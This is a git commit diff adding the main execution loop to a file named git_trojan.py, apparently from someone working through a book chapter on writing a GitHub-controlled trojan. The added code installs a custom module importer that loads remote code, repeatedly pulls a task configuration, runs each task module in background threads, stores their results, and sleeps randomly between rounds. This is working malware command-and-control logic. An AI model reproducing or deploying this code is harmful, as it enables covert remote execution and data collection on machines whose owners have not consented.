16bfd4f49dd5a2bdf21c441b6fdf8ecdba8f5860
wsrtka <witold.serwatka@pm.me>
2020-07-03 13:11:22 +0200

    added main functionalities

--- Chapter5/git_trojan.py
+++ Chapter5/git_trojan.py
@@ -106,3 +106,30 @@ class GitImporter(object):
         sys.modules[name] = module
 
         return module
+
+
+def module_runner(module):
+
+    task_queue.put(1)
+    result = sys.modules[module].run()
+    task_queue.get()
+
+    store_module_result(result)
+
+    return
+
+
+sys.meta_path = [GitImporter()]
+
+while True:
+
+    if task_queue.empty():
+
+        config = get_trojan_config()
+
+        for task in config:
+
+            t = threading.Thread(target=module_runner, args=(task['module'],))
+            t.start()
+        
+    time.sleep(random.randint(1, 10))
